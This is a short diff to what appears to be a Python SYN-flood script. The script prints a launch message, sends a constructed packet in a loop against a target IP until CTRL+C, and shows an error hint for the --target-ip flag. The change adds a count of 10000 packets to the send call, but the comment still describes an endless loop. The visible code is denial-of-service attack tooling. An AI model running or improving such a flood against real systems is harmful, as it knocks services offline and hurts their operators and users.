@@ -33,7 +33,7 @@ def main():
             
             print("The SYN Flood has commence, do CTRL+C to cancel / exit")
             
-            send(p, loop=1, verbose=0) # send the constructed packet in a loop until CTRL+C is detected
+            send(p, count=10000, loop=1, verbose=0) # send the constructed packet in a loop until CTRL+C is detected
             
     except:    
         print('[-]Please, use --target-ip or -t to set a Target IP Address!')
